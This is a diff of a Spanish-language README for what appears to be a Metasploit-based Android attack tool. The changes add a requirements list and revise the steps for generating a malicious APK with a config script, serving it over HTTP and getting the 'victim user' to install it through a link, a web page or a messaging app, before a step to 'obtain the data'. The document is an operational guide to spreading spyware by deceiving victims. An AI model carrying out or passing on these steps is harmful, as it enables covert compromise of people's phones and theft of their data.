@@ -1,3 +1,11 @@
+# 0. Requisitos
+
+    Asegurarnos de que tenemos todas las dependencias necesarias para ejecutar el script, como pueden ser:
+    - Metasploit
+    - Sudo
+    - Python3 (Se instalará automáticamente si no se tiene)
+    - psmisc (Se instalará automáticamente si no se tiene)
+
 # 1. Genear el payload y configuracion inicial
 
 Para ello utilizamos el comando
@@ -18,7 +26,7 @@ sudo bash config.sh -i 192.127.0.80 -p 4443
 
 Se creará un apk llamado main.apk
 Una vez ejecutado el coamndo anterior aparecerá un mensaje como el siguiente print_green "Archivo main.apk disponible en http://$LOCAL_IP:$PORT_PYTHON/main.apk"
-Una vez creado deverá ser instalado por el usuario victima, ya sea medante la url, a la web donde se encuentra un botón para ello, desde la ruta /main.apk, o pasandoselo de cualquier otra foprma.
+Deverá ser instalado por el usuario victima, ya sea medante la url, desde el index.html de la web, o pasandoselo de cualquier otra forma, como alguna aplicación de mensajería.
 
 # 3. Obtener los datos
 
